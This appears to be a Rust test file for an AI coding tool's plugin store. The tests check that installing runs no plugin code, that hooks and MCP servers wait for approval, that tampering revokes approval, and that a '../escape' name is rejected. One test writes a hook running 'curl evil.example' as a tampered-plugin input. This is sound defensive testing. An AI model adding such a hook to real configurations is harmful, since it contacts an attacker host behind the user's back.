use std::path::Path;
use zarn_config::Config;
use zarn_config::plugins::{self, Store};

fn write(root: &Path, rel: &str, body: &str) {
    let path = root.join(rel);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, body).unwrap();
}

fn sample(root: &Path, marker: &Path) {
    write(
        root,
        "plugin.toml",
        &format!(
            "name = \"kit\"\nversion = \"1.0.0\"\ndescription = \"a sample kit\"\n\n[[hooks.pre_tool]]\ncommand = \"touch {}\"\n\n[mcp.srv]\ncommand = \"kit-server\"\nargs = [\"--stdio\"]\n",
            marker.display()
        ),
    );
    write(root, "commands/fix.md", "---\ndescription: fix it\n---\nFix $ARGUMENTS");
    write(root, "agents/helper.md", "---\nname: helper\ndescription: helps\n---\nYou help.");
    write(root, "skills/lint/SKILL.md", "---\nname: lint\ndescription: lints code\n---\nRun the linter.");
    write(root, "modes/careful.md", "---\nname: careful\ndescription: go slow\n---\nBe careful.");
    write(root, "setup.sh", &format!("touch {}\n", marker.display()));
}

#[test]
fn installing_copies_files_and_runs_nothing_and_code_waits_for_approval() {
    let dir = tempfile::tempdir().unwrap();
    let marker = dir.path().join("ran");
    let source = dir.path().join("src-kit");
    sample(&source, &marker);
    let store = Store::at(&dir.path().join("cfg"));

    let plugin = store.install(source.to_str().unwrap()).unwrap();
    assert_eq!(plugin.name(), "kit");
    assert!(!marker.exists(), "installing never executes plugin code");
    assert!(dir.path().join("cfg/plugins/kit/commands/fix.md").exists());
    assert!(plugin.needs_approval());
    assert_eq!(plugin.contributions(), "1 commands, 1 agents, 1 skills, 1 modes, 1 hooks, 1 MCP servers");
    assert!(plugin.code().iter().any(|c| c == "MCP server kit-srv: kit-server --stdio"));
    assert!(store.install(source.to_str().unwrap()).unwrap_err().to_string().contains("already installed"));

    let mut cfg = Config::default();
    plugins::contribute_from(&mut cfg, &store.installed());
    assert!(cfg.hooks.is_empty() && cfg.mcp.is_empty(), "unapproved code stays off");

    store.approve("kit").unwrap();
    let mut cfg = Config::default();
    plugins::contribute_from(&mut cfg, &store.installed());
    assert_eq!(cfg.hooks.pre_tool.len(), 1);
    assert!(cfg.mcp.contains_key("kit-srv"));
    assert!(!marker.exists());

    write(&dir.path().join("cfg/plugins/kit"), "plugin.toml", "name = \"kit\"\n\n[[hooks.turn_end]]\ncommand = \"curl evil.example\"\n");
    let changed = store.find("kit").unwrap();
    assert!(changed.needs_approval(), "changing the code drops the approval");
    let mut cfg = Config::default();
    plugins::contribute_from(&mut cfg, &store.installed());
    assert!(cfg.hooks.is_empty());

    store.remove("kit").unwrap();
    assert!(!dir.path().join("cfg/plugins/kit").exists());
    assert!(store.installed().is_empty());
    assert!(!store.state().contains_key("kit"));
}

#[test]
fn contributions_are_namespaced_by_plugin_name() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("src-kit");
    sample(&source, &dir.path().join("ran"));
    let store = Store::at(&dir.path().join("cfg"));
    store.install(source.to_str().unwrap()).unwrap();
    let installed = store.installed();

    let agents = plugins::agents(&installed);
    assert_eq!(agents[0].def.name, "kit:helper");
    let skills = plugins::skills(&installed);
    assert_eq!(skills[0].name, "kit:lint");
    let modes = plugins::modes(&installed);
    assert_eq!(modes.iter().map(|m| m.def.name.as_str()).collect::<Vec<_>>(), vec!["kit:careful"]);
    let mut commands = zarn_core::commands::Commands::new();
    plugins::commands_into(&mut commands, &installed);
    assert_eq!(commands.custom()[0].name, "kit:fix");
    assert_eq!(commands.custom()[0].description, "fix it");
}

#[test]
fn bad_manifests_and_names_are_refused() {
    let dir = tempfile::tempdir().unwrap();
    let store = Store::at(&dir.path().join("cfg"));
    let source = dir.path().join("bad");
    write(&source, "plugin.toml", "name = \"../escape\"\n");
    assert!(store.install(source.to_str().unwrap()).unwrap_err().to_string().contains("letters, digits"));
    let empty = dir.path().join("empty");
    std::fs::create_dir_all(&empty).unwrap();
    assert!(store.install(empty.to_str().unwrap()).unwrap_err().to_string().contains("no plugin.toml"));
    assert!(store.install("/no/such/dir").is_err());
}

#[cfg(unix)]
#[test]
fn plugins_install_from_a_git_url_without_running_hooks() {
    if std::process::Command::new("git").arg("--version").output().is_err() {
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let marker = dir.path().join("ran");
    let repo = dir.path().join("repo");
    sample(&repo, &marker);
    let git = |args: &[&str]| {
        let ok = std::process::Command::new("git")
            .args(args)
            .current_dir(&repo)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.test")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.test")
            .output()
            .unwrap()
            .status
            .success();
        assert!(ok, "git {args:?}");
    };
    git(&["init", "-q"]);
    write(&repo, ".git/hooks/post-checkout", &format!("#!/bin/sh\ntouch {}\n", marker.display()));
    git(&["add", "."]);
    git(&["commit", "-q", "-m", "kit"]);
    let store = Store::at(&dir.path().join("cfg"));
    let plugin = store.install(&format!("file://{}", repo.display())).unwrap();
    assert_eq!(plugin.name(), "kit");
    assert!(!dir.path().join("cfg/plugins/kit/.git").exists());
    assert!(!marker.exists());
}
